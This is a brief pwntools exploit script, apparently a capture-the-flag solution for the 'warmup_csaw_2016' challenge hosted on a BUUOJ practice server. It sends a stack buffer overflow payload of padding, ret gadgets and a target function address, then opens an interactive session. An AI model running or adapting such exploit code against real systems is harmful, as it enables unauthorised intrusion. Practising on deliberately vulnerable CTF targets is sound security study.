from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

vuln = 0x40060d
ret = 0x4006a4
conn = remote('node4.buuoj.cn',26308 )
#conn = process('./warmup_csaw_2016')
conn.recvuntil(b'>')

payload = b'a' * (0x40 + 0x8)
payload += p64(ret) *2
payload += p64(vuln)
conn.sendline(payload)

conn.interactive()

